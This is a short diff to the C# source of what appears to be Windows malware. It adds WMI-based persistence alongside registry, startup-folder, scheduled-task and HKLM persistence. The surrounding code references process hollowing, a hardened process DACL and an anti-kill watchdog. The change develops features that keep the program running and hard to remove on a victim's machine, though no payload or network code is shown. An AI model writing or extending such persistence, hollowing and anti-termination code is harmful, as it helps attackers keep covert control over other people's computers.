@@ -191,6 +191,7 @@ partial class Program
             if (Config.PersistRegistry) Persistence.InstallRegistry(Config.PersistName);
             if (Config.PersistStartup)  Persistence.InstallStartup(Config.PersistName);
             if (Config.PersistTask)     Persistence.InstallScheduledTask(Config.PersistName);
+            if (Config.PersistWmi)      Persistence.InstallWmi(Config.PersistName);
             if (isAdm && Config.PersistRegistry) Persistence.InstallRegistryHKLM(Config.PersistName);
             return;
         }
@@ -287,7 +288,7 @@ partial class Program
         // Persistence BEFORE hollowing (so Environment.ProcessPath = original exe)
         if (!ProcessHollowing.IsHollowedInstance())
         {
-            bool hasPersist = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
+            bool hasPersist = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask || Config.PersistWmi;
             if (hasPersist)
             {
                 // Release mutex BEFORE EnsureInstalled so the relaunched copy can acquire it.
@@ -386,7 +387,7 @@ partial class Program
         {
             Protection.ProtectProcessDacl();
             Protection.StartAntiKillWatchdog();
-            bool hasPersist2 = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
+            bool hasPersist2 = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask || Config.PersistWmi;
             if (hasPersist2)
             {
                 Persistence.StartWatchdog(Config.PersistName);
